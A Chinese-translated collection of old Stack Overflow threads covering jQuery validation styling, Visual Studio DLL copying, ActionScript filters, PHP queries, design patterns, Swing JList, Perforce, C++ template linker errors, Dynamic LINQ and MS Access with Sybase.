我试过你的代码，它对我来说非常好。这是一个预览： ![替代文字](https://s12.postimg.cc/6z1jnovz1/gt5o0.png)

我只是对消息填充进行了非常小的调整，以使其适合该行：

```
div.error {
    padding: 2px 5px;
} 
```

您可以更改这些数字以增加/减少顶部/底部或左侧/右侧的填充。您还可以在错误消息中添加高度和宽度。如果您仍然遇到问题，请尝试将 span 替换为 div

```
<div class="group">
<input type="radio" class="checkbox" value="P" id="radio_P" name="radio_group_name"/>
<label for="radio_P">P</label>
<input type="radio" class="checkbox" value="S" id="radio_S" name="radio_group_name"/>
<label for="radio_S">S</label>
</div> 
```

然后给容器一个宽度（这个很重要）

```
div.group {
    width: 50px; /* or any other value */
} 
```

关于空白页。正如我所说，我尝试了您的代码，它对我有用。导致问题的可能是代码中的其他内容。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-05-15T22:58:42.227

我使用[jQuery BeautyTips](http://www.lullabot.com/files/bt/bt-latest/DEMO/index.html)来实现你所说的小气泡效果。我不使用 Validation 插件，所以我真的帮不上什么忙，但是很容易设计和显示 BeautyTips。你应该调查一下。恐怕它不像 CSS 规则那么简单，因为您需要使用 canvas 元素并包含一个额外的 javascript 文件，以便 IE 使用它。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-05-21T09:31:04.810

一些东西：

首先，我认为您真的不需要对无线电字段集进行验证错误，因为您可以默认检查其中一个字段。大多数人宁愿纠正一些东西，然后提供一些东西。例如：

```
 Age: (*) 12 - 18 | () 19 - 30 | 31 - 50 
```

更有可能更改为正确答案，因为该人不希望它变为默认值。如果他们看到它空白，他们更有可能认为“不关你的事”并跳过它。

其次，我能够在没有任何定位属性的情况下获得我认为您想要的效果。您只需将 padding-right 添加到表单（或表单的 div 等），为您的错误提供足够的空间，并确保您的错误适合该区域。然后，您有一个名为“error”的预先设置的css类，并将其设置为具有大约输入字段高度的负边距顶部和大约从左侧到填充右侧的距离的左侧边距应该开始。我试过了，它不是很好，但它适用于三个属性并且不需要浮点数或绝对值：

```
 <style type="text/css">
    .error {
        width: 13em; /* Ensures that the div won't exceed right padding of form */
        margin-top: -1.5em;  /*Moves the div up to the same level as input */
        margin-left: 11em;   /*Moves div to the right */
        font-size: .9em;     /*Makes sure that the error div is smaller than input */
    }

   <form>
   <label for="name">Name:</label><input id="name" type="textbox" />
   <div class="error"><<< This field is required!</div>
   <label for="numb">Phone:</label><input id="numb" type="textbox" />
   <div class="error"><<< This field is required!</div>
   </form> 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2010-02-08T22:23:56.377

不幸的是，我无法评论我的新手声誉，但我有一个解决屏幕变黑问题的解决方案，或者至少这对我有用。不要在 errorPlacement 函数内设置包装器类，而是在设置包装器类型时立即设置它。

```
$('#myForm').validate({
    errorElement: "div",
    wrapper: "div class=\"message\"",
    errorPlacement: function(error, element) {
        offset = element.offset();
        error.insertBefore(element);
        //error.addClass('message');  // add a class to the wrapper
        error.css('position', 'absolute');
        error.css('left', offset.left + element.outerWidth() + 5);
        error.css('top', offset.top - 3);
    } 
```

});

我假设这样做可以让验证器知道要删除哪些 div 元素，而不是全部。为我工作，但我不完全确定为什么，所以如果有人能详细说明这可能会帮助其他人。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2010-05-27T23:45:02.173

这个答案真的帮助了我，在我的情况下，我必须过滤掉一些元素并对他们的错误 div 进行特殊对齐，

```
errorPlacement:function(error,element) {
    if (element.attr("id") == "special_element") {
        // special align
    } else { // default error scheme
        error.insertAfter(element);
    }
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2014-10-20T05:15:17.373

将以下 css 添加到您的 .validate 方法以更改 css 或功能

> ```
>  errorElement: "div",
>     wrapper: "div",
>     errorPlacement: function(error, element) {
>         offset = element.offset();
>         error.insertAfter(element)
>         error.css('color','red');
>     } 
> ```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-05-14T08:29:51.687

如果您可以提供一些理由说明为什么需要用 div 替换标签，那肯定会有所帮助...

另外，您能否粘贴一个有用的示例（[http://dpaste.com/](http://dpaste.com/)或[http://pastebin.com/](http://pastebin.com/)）

# visual-studio - 如何在未经我许可的情况下让 Visual Studio 在构建期间停止复制 DLL？

> ID：860058
> 
> 赞同：8
> 
> 时间：2009-05-13T19:51:07.270
> 
> 标签：visual-studio, copy-local

我有一个依赖于几个 DLL 引用的 Visual Studio 项目。这是我的 csproj 中这些引用的示例：

```
<ItemGroup>
  <Reference Include="Class1.Project1">
    <SpecificVersion>False</SpecificVersion>
    <HintPath>..\bin\Class1.Project1.dll</HintPath>
    <Private>False</Private>
  </Reference>
  <Reference Include="Class1.Project2">
    <SpecificVersion>False</SpecificVersion>
    <HintPath>..\bin\Class1.Project2.dll</HintPath>
    <Private>False</Private>
  </Reference>
</ItemGroup> 
```

但是，当我将此类作为项目依赖项包含在网站项目中时，Visual Studio 会查找上面显示的依赖项的依赖项。在构建过程中，Visual Studio 会将“Copy Local”属性默认为“True”，并将这些依赖项复制到我网站的 ~/bin 目录中。

这反过来又会覆盖该目录中已存在的 DLL 文件的版本。这会导致以下错误：

> 无法加载文件或程序集 'Class5.Project5, Version=3.6.1861.2, Culture=neutral, PublicKeyToken=dfeaee0e3978ac79' 或其依赖项之一。找到的程序集的清单定义与程序集引用不匹配。（来自 HRESULT 的异常：0x80131040）

如何使 Visual Studio 将*所有内容*的“复制本地”设置默认为“假” ？我不希望 Visual Studio 在构建期间自动复制 DLL 文件。我也不想将我的构建绑定到*非常*特定的 DLL 版本。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-18T09:21:25.167

在我看来，好像您将多个项目配置为输出到同一个目录 - 这是真的吗？

如果是这样，您需要检查您的配置，因为 Visual Studio 假定（不，*需要*）每个项目都有一个唯一的输出目录。

另外，你写道：

> 这反过来又会覆盖该目录中已存在的 DLL 文件的版本。

这些现有文件是从哪里来的？

Visual Studio 假定它拥有在构建输出目录中进行任何它认为合适的更改的完全权利 - 尝试与之争论是通往全新痛苦世界的好途径。

（不幸的是，我是根据经验说话的。叹息。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-15T11:40:22.093

我曾经遇到过这个问题，

**发布**时：防止覆盖现有 dll 文件的最简单方法是将它们设置为只读。对于无法替换的每个文件，您将在发布时收到警告，但它会完成这项工作。

**On Build**：要自动关闭 CopyLocal，您需要将 dll 文件放在 GAC 上。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-03T16:45:22.300

您可以在项目文件中尝试以下操作。

```
<ReferenceOutputAssembly>false</ReferenceOutputAssembly> 
```

然后，在你的代码中试试这个。

```
<ItemGroup>
  <Reference Include="Class1.Project1">
    <SpecificVersion>False</SpecificVersion>
    <HintPath>..\bin\Class1.Project1.dll</HintPath>
    <ReferenceOutputAssembly>false</ReferenceOutputAssembly>
  </Reference>
  <Reference Include="Class1.Project2">
    <SpecificVersion>False</SpecificVersion>
    <HintPath>..\bin\Class1.Project2.dll</HintPath>
    <ReferenceOutputAssembly>false</ReferenceOutputAssembly>
  </Reference>
</ItemGroup> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-15T11:58:37.167

为什么 bin 目录中已经有其他版本？

无论如何，我想知道您是否会在使用 Web 应用程序项目时遇到同样的问题。由于它是一个项目，它有一个列出直接引用的文件，如果这些是项目引用（对同一解决方案中其他程序集的输出的引用），则 MSBUILD 可以确保使用正确的版本。

看看您是否可以通过从一个新的 Web 应用程序项目开始并添加引用来重现这一点。

# flash - 向影片剪辑添加不带偏移的投影

> ID：860066
> 
> 赞同：0
> 
> 时间：2009-05-13T19:53:30.323
> 
> 标签：flash, actionscript-3

我正在尝试向 Flash 中的影片剪辑添加阴影外观（没有偏移）。使用下面的 Actionscript，我可以添加带有偏移的投影。

```
import flash.filters.DropShadowFilter;

var dropShadow:DropShadowFilter = new DropShadowFilter(5, 45, 0x333333, 20, 10, 10, 1, 2, false, false, false); 
container_mc.filters = new Array(dropShadow); 
```

如何创建没有任何偏移的投影效果（围绕影片剪辑）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-14T07:27:29.837

您可以从[将距离属性](http://help.adobe.com/en_US/AS3LCR/Flash_10.0/flash/filters/DropShadowFilter.html#distance)设置为零开始。

```
var dropShadow:DropShadowFilter = new DropShadowFilter(0, 45, 0x333333, 20, 10, 10, 1, 2, false, false, false);
container_mc.filters = [dropShadow]; // the brackets are shorthand for a new array 
```

如果这不符合您的喜好，请尝试使用黑色[GlowFilter](http://help.adobe.com/en_US/AS3LCR/Flash_10.0/flash/filters/GlowFilter.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-14T07:36:04.297

您应该为此使用[GlowFilter](http://help.adobe.com/en%5FUS/AS3LCR/Flash%5F10.0/flash/filters/GlowFilter.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-14T07:39:58.343

你只需要一个发光滤镜

新的 GlowFilter（颜色，alpha，blurX，blurY，强度，质量，内部，淘汰赛）；

[辉光滤镜类参考](http://help.adobe.com/en_US/AS3LCR/Flash_10.0/flash/filters/GlowFilter.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-07-02T10:44:39.880

可以在这里看到， http: [//livedocs.adobe.com/flash/9.0/ActionScriptLangRefV3/flash/filters/DropShadowFilter.html#DropShadowFilter%28%29](http://livedocs.adobe.com/flash/9.0/ActionScriptLangRefV3/flash/filters/DropShadowFilter.html#DropShadowFilter%28%29)

你应该改变第一个参数，

```
import flash.filters.DropShadowFilter;

var dropShadow:DropShadowFilter = new DropShadowFilter(0., 45, 0x333333, 20, 10, 10, 1, 2, false, false, false); 
container_mc.filters = new Array(dropShadow); 
```

或者你可以稍后改变距离，

```
dropShadow.distance = 0.; 
```

另外，您是否意识到您使用的最后 3 个参数是默认值，因此您可以删除该部分以缩短代码，

```
import flash.filters.DropShadowFilter;

var dropShadow:DropShadowFilter = new DropShadowFilter(0., 45, 0x333333, 20, 10, 10, 1, 2); 
container_mc.filters = new Array(dropShadow); 
```

祝你使用 flash/as3 好运！

# php - 两个查询对一个查询，性能

> ID：860071
> 
> 赞同：0
> 
> 时间：2009-05-13T19:53:55.110
> 
> 标签：php, mysql, performance, oop

在PHP+MySQL+PDO中，会不会慢很多

*   按名称获取项目的 ID
*   通过 ID 获取商品数据

不仅仅是

*   按名称获取项目数据

后者只是一个查询，所以显然更快。前者使代码更简洁（因为项目的 ID 通常也是事先知道的），所以如果性能差异足够小会更好。

我使用这个的代码：

公共功能动作视图（）{

```
 // read http request
    ...

    // get item
    $itemModel = new Rust_Model_Item();
    try {
        $id = $itemModel->getItemIdByUrlTitle($urltitle);
        $item = $itemModel->getItem($id); // lots of data
    } catch (Rust_Model_Item_NotFoundException $e) {
        throw new FastMVC_Web_Error(404, 'Item not found');
    }

    ...

} 
```

[http://code.heukelom.net/filedetails.php?repname=rust&path=%2Ftrunk%2Flib%2Fclasses%2FRust%2FController%2FItem.php](http://code.heukelom.net/filedetails.php?repname=rust&path=%2Ftrunk%2Flib%2Fclasses%2FRust%2FController%2FItem.php)

公共函数 getItem($id) {

```
 $item = $this->getItemBasics($id);

    $catModel = new Rust_Model_Category();
    $item['category'] = $catModel->getById($item['category_id']);

    $ratingModel = new Rust_Model_Rating();
    $item['rating'] = $ratingModel->getForItem($id);

    $pageModel = new Rust_Model_Page();
    $item['pages'] = $pageModel->getListForItem($id);

    $tagModel = new Rust_Model_Tag();
    $item['tags'] = $tagModel->getForItem($id);

    return $item;

} 
```

[http://code.heukelom.net/filedetails.php?repname=rust&path=%2Ftrunk%2Flib%2Fclasses%2FRust%2FModel%2FItem.php](http://code.heukelom.net/filedetails.php?repname=rust&path=%2Ftrunk%2Flib%2Fclasses%2FRust%2FModel%2FItem.php)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-13T19:57:40.673

您应该设计您的查询，以便您在 WHERE 子句中使用的字段具有正确的键和索引设置，并且只使用一个查询来选择它们。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T19:58:47.333

为什么不创建一个通过 id 获取项目数据的查询，在 id 上放置一个索引。

# design-patterns - 桥接模式与提供者模式相同吗？

> ID：860084
> 
> 赞同：2
> 
> 时间：2009-05-13T19:57:17.710
> 
> 标签：design-patterns

桥接模式是否与提供者模式相同。我没有看到 GoF 书中列出的提供者模式

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T16:39:27.440

也许不同之处在于提供者模式可能会封装许多桥梁？

我也在问自己同样的问题，发现很难看出区别。

我认为提供者模式基本上是策略模式。

一个可能有助于消除我的困惑的问题

[什么时候使用桥接模式？它与适配器模式有何不同？](https://stackoverflow.com/questions/319728/when-do-you-use-the-bridge-pattern)

IE 是的，它们在示例中看起来很相似，但它们的目的不同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-13T20:14:44.140

我会说它们“非常相似”，考虑一下 Steven Metsker 在 C# 中的设计模式：他在 pg 上为数据库驱动程序提供了桥接模式的实现。71\. 当我读到它时，它看起来像 Bridge Clothing 中的提供者模式。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T20:16:34.497

不熟悉提供者模式。桥接模式的目的是将抽象与其相应的实现分离。简单的例如代码：

```
class Abstraction
{
  IBridge _bridge;
  public Abstraction(IBridge implementation) { _bridge=implementation; }
  public DoStuff() { _bridge.DoStuff(); }
}

interface IBridge
{
  void DoStuff();
}

class BridgeA : IBridge
{
  void DoStuff() {...}
}

class BridgeB : IBridge
{
  void DoStuff() {...}
} 
```

# java - Java问题：需要一个排序的JList来表示一个数据库表

> ID：860086
> 
> 赞同：0
> 
> 时间：2009-05-13T19:57:31.643
> 
> 标签：java, database, swing, sorting, jlist

我找到了一个排序 JList 的[示例](http://java.sun.com/developer/technicalArticles/J2SE/Desktop/sorted_jlist/)，但我的应用程序由嵌入式 H2 数据库提供支持，所以我想知道是否有更好的方法来实现这一点。特别是考虑到有问题的表可能会变得非常大，并且在 JList 的列表模型中复制所有这些数据似乎有点违背了拥有数据库来管理它的意义。

有没有好的方法来做到这一点？还是我被迫拼凑一些笨拙的技巧以允许 JList “滚动”通过动态查询的数据块或其他东西？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-13T20:18:08.050

您`JList`的 's`ListModel`负责将支持数据公开为有序列表。*`ListModel`的方法将被`JList`UI（AWT 事件）线程调用，因此它的性能需要相当不错。*这就是为什么大多数实现`ListModel`在内存中都有 ' 的支持数据。我想你可以`ListModel`用你的数据库作为支持数据来实现。您很可能会扩展`AbstractListModel`以获取侦听器注册，并实现`getElementAt(int)`和`getSize()`. `getElementAt`然后将负责获取特定索引的对象。请记住，这`JList`将调用`getElementAt`多次针对不同的索引，因此您可能会发现自己正在缓存结果。根据您缓存的数据量，您可能只从数据库中检索整个数据集。

# visual-studio-2008 - Visual Studios 2008 中的 Perforce 问题

> ID：860090
> 
> 赞同：0
> 
> 时间：2009-05-13T19:58:32.577
> 
> 标签：visual-studio-2008, ssis, perforce

我的团队使用 Visual Studios 2008 开发 SSIS 包，我们使用 Perforce 作为我们的源代码控制系统。当用户将文件添加到项目时，该项目会自动签出，而无需检查它是否是当前版本。 **有没有办法强制 Visual Studios 在签出文件之前获取文件的最新版本？**

我们通常确定这发生在 Visual Studios 中的文件“丢失”之后。以下是通常发生的情况：

1.  用户 A 将文件添加到项目中。
2.  用户 A 同时签入项目和新文件。
3.  用户 B 在未获取最新版本的情况下签出项目
4.  用户 B 添加文件。
5.  用户 B 签入项目和新文件。
6.  用户 A 获得最新的项目定义并注意到他们的文件“丢失”。

作为预防措施，我要求我的团队成员在添加文件之前立即获取最新的项目定义。尽管采取了这种预防措施，但错误仍在继续发生，文件“消失”。尽管我们可以手动从 Perforce 中检索它们并将它们添加回项目定义中，但我们根本不必经历这种痛苦。我知道 Perforce 可以自动检测文件的更改。Perforce 将自动将您的本地副本与服务器版本进行比较，如果在您选择撤消签出时检测到差异，则替换本地版本。必须有一种方法可以强制它在允许文件像 VSS 一样被签出之前进行检查。 ***当我的开发人员告诉我他们想回到 VSS 时，我很难过。***

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-06-13T00:22:28.427

这可能是与 P4SCC 和 Visual Studio 一起使用的“共享”工作区客户端的问题。工作空间客户端应该对每个用户和机器都是唯一的——Perforce 使用工作空间客户端来跟踪特定机器工作空间的内容。

以下是当两个用户都使用同一个工作区客户端时发生的情况：

*   用户 A 和 B 都使用“standard_1”客户端强制同步到最新版本。have 表在服务器上更新，注意项目“foo”处于修订版 #12。

*   用户 B 签出“foo”，添加文件并提交。现在已经更新了 have 表，并注意到项目“foo”在 standard_1 工作区中的修订版 #13。

*   用户 A 现在签出项目“foo”，添加一个文件，并提交——没有冲突——作为标准 1 工作区中的修订 #14，因为 Perforce 认为该工作区已经有 #13。

解决方案是确认每个用户都有其机器独有的工作区客户端规范。这将分离每个用户工作区的拥有列表，并且每次都将出现编辑警告和签入冲突。

# c++ - 这些链接错误是什么意思？(C++) (MSVC++)

> ID：860093
> 
> 赞同：1
> 
> 时间：2009-05-13T19:58:42.933
> 
> 标签：c++, templates, linker

编辑：当我将 link_def.cpp 与 link_dec.h 合并时，我只得到第一个错误，而不是第二个错误。

当我试图编译一些代码时，我得到了这些链接器错误：代码：

```
#include"list_dec.h"
#include"catch.h"

int main()
{
    list<int, 100> L1;
    try
    {
        L1.return_current();
    }
    catch(err)
    {
        return -1;
    }
    return 0;
} 
```

错误：

```
Linking...
main.obj : error LNK2019: unresolved external symbol "public: __thiscall list<int,100>::~list<int,100>(void)" (??1?$list@H$0GE@@@QAE@XZ) referenced in function __catch$_main$0
main.obj : error LNK2019: unresolved external symbol "public: int __thiscall list<int,100>::return_current(void)" (?return_current@?$list@H$0GE@@@QAEHXZ) referenced in function _main
main.obj : error LNK2019: unresolved external symbol "public: __thiscall list<int,100>::list<int,100>(void)" (??0?$list@H$0GE@@@QAE@XZ) referenced in function _main 
```

如果有人需要 list_dec.h、catch.h 和 list_def.cpp 的代码（列表类的定义），请发表评论，如果它们无关紧要，我不想包括它们，因为它们非常大.

因为有人想看list_dec.h（我暂时和list_def.cpp合并了）list_dec.h：

```
template<class T, size_t limit>
class list
{
public:
    //constructors
    list();
    list(const list<T, limit>& lst);
    ~list();

    //assignment operator
    void operator=(const list<T, limit>& lst);

    //append new items
    void append(const T& item);

    //clear the list
    void clear();

    //return current item
    T return_current();

    //test if item is last item
    bool last();

    //make current item head of the list
    void make_head();

    //move to the next item
    bool next();

    //interrogation
    size_t return_count();
    size_t return_limit();

protected:
    size_t count; //# of items in list
    size_t current; //current item
    T data[limit]; //array of elements of list

    //internal functions
    void copy(const list<T, limit>& lst);
};

//copier function
template<class T, size_t limit>
void list<T, limit>::copy(const list<T, limit>& lst)
{
    count = lst.count;
    current = lst.current;

    for(size_t n = 0; n < count; n++)
    {
        data[n] = lst.data[n];
    }
    return;
}

//constructor
template<class T, size_t limit>
inline list<T, limit>::list()
{
    count = 0;
    current = 0;
}

//copy constructor
template<class T, size_t limit>
inline list<T, limit>::list(const list<T, limit>& lst)
{
    copy(lst);
}

//assignment operator
template<class T, size_t limit>
inline void list<T, limit>::operator=(const list<T, limit>& lst)
{
    clear();
    copy(lst);
    return;
}

//destructor
template<class T, size_t limit>
inline list<T, limit>::~list()
{
    clear();
}

//append function
template<class T, size_t limit>
void list<T, limit>::append(const T& item)
{
    if(count == limit)
    {
        throw CX_OVERFLOW;
    }
    data[count] = item;
    count++;
    return;
}

//return current item
template<class T, size_t limit>
T list<T, limit>::return_current()
{
    if(count == 0)
    {
        throw CX_NULL;
    }
    if(current == count)
    {
        throw CX_ATEND;
    }
    return data[current];
}

//test if <current> pointer is at tail
template<class T, size_t limit>
inline bool list<T, limit>::last()
{
    if(current == count)
    {
        return true;
    }
    else
    {
        return false;
    }
}

//set current pointer to head
template<class T, size_t limit>
inline void list<T, limit>::make_head()
{
    current = 0;
    return;
}

//set current pointer to next pointer in list
template<class T, size_t limit>
bool list<T, limit>::next()
{
    if(count == 0)
    {
        throw CX_NULL;
    }
    if(current == count)
    {
        throw CX_ATEND;
    }

    current++;

    if(current == count)
    {
        return false;
    }

    return true;
}

//interrogation functions
template<class T, size_t limit>
inline size_t list<T, limit>::return_count()
{
    return count;
}
template<class T, size_t limit>
inline size_t list<T, limit>::return_limit()
{
    return limit;
} 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-05-13T20:14:20.100

可以通过一些努力来读取链接器错误。试一试吧：

```
main.obj : error LNK2019: unresolved external symbol "public: __thiscall list<int,100>::~list<int,100>(void)" (??1?$list@H$0GE@@@QAE@XZ) referenced in function __catch$_main$0 
```

*   错误发生在`main.obj`，即 main.cpp 生成的目标文件中。
*   问题是“未解决的外部符号”。也就是说，您引用了一个预期在另一个编译单元中定义的符号，但链接器找不到这个定义。
*   有问题的符号是公共成员函数（__thiscall 是成员函数的调用约定）。
*   现在我们得到了真正有用的信息：`list<int,100>::~list<int,100>(void)"`告诉我们问题出在类模板列表的析构函数上，专门用于`<int, 100>`. 这部分格式很好，非常简单。对于第二个错误，我们还看到了返回类型：`int __thiscall list<int,100>::return_current(void)`. 也就是说，一个返回 int 的函数，使用 __thiscall 调用约定，属于 list，被称为 return_current，并且不带参数。
*   `??1?$list@H$0GE@@@QAE@XZ`几乎可以忽略不计。这是符号的名称，由编译器修改，因此这是链接器在 .obj 文件中查找的名称。但由于链接器已经告诉我们符号的可读 C++ 名称，我们并不真的需要它。（除非您决定自己去挖掘 .obj 文件）。
*   最后，它告诉我们该符号在函数 main 中被引用。（读取链接器错误时的一般规则是忽略您不理解的位。而且我不完全确定这里的“catch”部分是什么意思，但它与您在 main.h 中执行的异常处理有关。

所以你有它。第一个错误表明找不到列表的析构函数的定义。如果函数未在类定义中内联声明，则应在另一个 .cpp 文件中定义。我假设这是你的`list_def.cpp`，并且这个文件也被编译并传递给链接器。

然而，这给我们带来了模板的一个很好的小问题。它们是编译时构造，并且必须在编译器为其发出代码之前实例化模板。在编译器的输出中，不存在类 template 的代码`list`，也不存在 specialization的代码`list<int, 84>`，因为没有使用该专业化。编译器只生成实际需要的特化。

当编译器处理 list_def.cpp 时，似乎*不需要专门化。*它无法查看其他 .cpp 文件，例如您的 main.cpp。它只看到当前正在编译的 .cpp 文件，以及它`#include`的任何内容。由于它看不到`list<int, 100>`，因此它不会为该特化生成任何代码，然后当目标文件传递给链接器时，它无法找到`list<int, 100>`符号的定义并发出错误。

通常的解决方案是在标题中内联定义类模板的所有成员。这样，定义对包括头文件在内的任何编译单元都是可见的，因此编译器可以创建所需的模板特化。

具体来说，以下将产生链接器错误：

```
// .h
template <int n>
class Foo {
  int Bar();
};

// .cpp
template <int n>
int Foo::Bar() {
  return n; // Error: This is not visible from other .cpp files
} 
```

因此，只需将 .cpp 内容移动到标题中：

```
// .h
template <int n>
class Foo {
  int Bar();
};

template <int n>
int Foo::Bar() {
  return n; // Error: This is will cause the function to be defined in every .cpp file that includes it, so you'll get a *different* linker error instead (multiple definitions)
} 
```

但这有效，并且是通常的解决方案

```
// .h
template <int n>
class Foo {
  int Bar() { return n; } // just define it here, inside the class definition, and it is implicitly inline, so it's ok that multiple .cpp files see it
}; 
```

或者：

```
// .h
template <int n>
class Foo {
  int Bar();
};

// still in .h
template <int n>
inline int Foo::Bar() { // explicitly marking it inline works too. Now the compiler knows that it might be defined in multiple .cpp files, and these definitions should be merged back together
  return n;
} 
```

一个更不寻常但偶尔有用的解决方案是在定义它的编译单元中显式实例化模板。因此`list_def.cpp`，在模板定义之后添加这一行：

```
template class list<int, 100>; 
```

这告诉编译器专门为该专业化生成代码，即使在此编译单元中没有使用它。显然，这种方法只有在您事先知道需要哪些专业时才有用。

**编辑：**

看起来您从未定义`clear()`从析构函数调用的函数。这就是在标头中包含所有内容后出现最终链接器错误的原因。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T20:14:41.630

另一个预感：你是如何定义类模板的成员函数的？他们是`inline`d吗？您是否在单独的实现文件中有定义？如果你这样做了，你可能会遇到这个问题：[FAQ 35.16](http://www.parashift.com/c++-faq-lite/templates.html#faq-35.16)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T20:03:12.333

你确定你真的在编译和链接 list_def.cpp （我想你的 list<> 模板是在哪里定义的）？链接器找不到您正在使用的三个成员中的任何一个（析构函数、return_current() 或默认构造函数。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-13T20:11:16.907

我的直觉告诉我，您可能没有正确声明模板专业化。如果您的列表类实现是通用的，那么您需要告诉编译器您将使用它的类型。只是把线

```
template class list<int, 100>; 
```

在 list_def.cpp 的底部很可能会解决您的问题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-13T20:12:43.847

在我的编程经验中，每当我有一个模板类时，我都会遵循以下内容

```
#ifndef MY_LIST
#define MY_LIST
class List< [...] >
{ 
[ ...]
};

#include "MyListImplementation.h"
#endif 
```

实际的实现代码也放在“.h”文件中，而不是 CPP 文件中，我不确定为什么会发生这种情况，但我知道这样你可以让它工作。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-13T20:12:51.680

你是在list_dec.h还是list_dec.cpp中实现了模板类list的方法？

如果不是，您应该移动它们，因为模板方法实现必须始终对所有使用点可见。

# linq - 如何使用带有 IEnumerable(Of T) 的 System.LINQ.Dynamic 程序集

> ID：860094
> 
> 赞同：3
> 
> 时间：2009-05-13T19:58:47.193
> 
> 标签：linq, sorting, dynamic

我正在尝试从 Phil Haack[那里](http://haacked.com/archive/2009/04/14/using-jquery-grid-with-asp.net-mvc.aspx)获取最终解决方案，并使用他的杀手级 LINQ 查询进行排序，但我不想像他那样使用数据上下文，而是想查询 IEnumerable(Of T) ......没有任何运气。

```
Public Function DynamicGridData(ByVal sidx As String, ByVal sord As String, ByVal page As Integer, ByVal rows As Integer) As ActionResult
Dim list As List(Of User) = UserService.GetUserCollection()
Dim FilteredAndSortedList = list.OrderBy(sidx + " " + sord).Skip(pageIndex * pageSize).Take(pageSize)

Return JSON(jsonData)
End Function 
```

目前，我的 .OrderBy(sidx + " " + sord) 行下方出现错误

“扩展方法'Public Function OrderBy(Of TKey)(keySelector As System.Func(Of User, TKey)) As System.Linq.IOrderedEnumerable(Of User)'中定义的“数据类型” 'System.Linq.Enumerable' 无法从这些参数中推断出来。明确指定数据类型可能会更正此错误。

**编辑：**

我发现问题在于上面示例中的“列表”不是 IQueryable 类型。只需添加 .AsQueryable() 就可以了！

```
Public Function DynamicGridData(ByVal sidx As String, ByVal sord As String, ByVal page As Integer, ByVal rows As Integer) As ActionResult
Dim list As List(Of User) = UserService.GetUserCollection()
Dim FilteredAndSortedList = list.AsQueryable().OrderBy(sidx + " " + sord).Skip(pageIndex * pageSize).Take(pageSize)

Return JSON(jsonData)
End Function 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-13T20:33:12.690

我不是很肯定，但我认为这与您传递到 OrderBy 字符串而不是它所期望的 Expression(TDelegate) 的事实有关。

看看这篇文章，看看它是否有帮助。

[http://msdn.microsoft.com/en-us/library/bb549264.aspx](http://msdn.microsoft.com/en-us/library/bb549264.aspx)

编辑：

我查看了 Phil 的代码和 Scott Gu 提供的一些进一步的文档。您应该能够传入一个用于排序的字符串。在这种情况下，我的下一个问题是，如果你通过你的应用程序是否工作来取出订单？这样做的原因是我想知道我们是否还有另一个我们遗漏的潜在错误。例如，您正在返回 JSON(jsondata)，但我看不到您在哪里初始化 jsondata。现在我不认为这是你的错误，因为你声明你在 orderby 语句中得到它。但是，如果您实际上收到错误是因为您尝试订购的对象是空的，那么您还有另一个潜在问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2010-01-06T16:40:41.863

这对我有用

[http://weblogs.asp.net/scottgu/archive/2008/01/07/dynamic-linq-part-1-using-the-linq-dynamic-query-library.aspx](http://weblogs.asp.net/scottgu/archive/2008/01/07/dynamic-linq-part-1-using-the-linq-dynamic-query-library.aspx)

# ms-access - MS-access 前端与 sybase Sql Anywhere 数据库，优缺点

> ID：860096
> 
> 赞同：2
> 
> 时间：2009-05-13T19:59:01.950
> 
> 标签：ms-access, sqlanywhere

我正在考虑将我的简单 ms-access 2003 客户端服务器桌面应用程序移至一个具有 ms-access 界面和 sybase 10 或 11 sql Anywhere 后端数据库的应用程序。为什么？因为我想： - 利用简单快捷的方式访问可以构建表单和报告（我已经熟悉......这对我来说意味着更少的学习曲线） - 利用可靠和高效的方式 sybase dbs设置为使用 mobilink 跨各种类型的网络同步数据。

我不想使用访问复制，因为数据最终会在后端增长到 2GB 以上。

那么， - 这种方法的优缺点是什么？- 我可以在 VBA 中使用 DSN 或连接字符串链接到 sybase 数据库表并继续吗？- 通过 ms-access 表单导航和更新/删除记录是否需要任何特殊考虑？

谢谢您的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-14T23:50:18.370

两者都完成后，我可以衷心推荐链接表选项作为首选。

过去，我曾使用 Access 前端到 MS-SQL Server 后端。大体上，它与使用本地访问表相同，但也有一些例外。我没有使用过 SQL Anywhere，但 MS_SQL 在自动编号字段等方面存在问题（与 Access 的行为不同）。

我最近还在一个 MS-SQL 后端的 Access 前端工作，其中没有使用正常的访问连接方法，而是支持基于表的函数和存储过程......这对代码来说绝对是一场噩梦，并且几乎抵消了将 Access 作为 Rad 工具使用的所有好处。如果我要再次这样做，我会坚持忘记 Access，并使用 VB.Net 作为前端。考虑到如今 MS Report Server 的性能有多好，真的没有理由再使用 Access。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-13T22:45:30.917

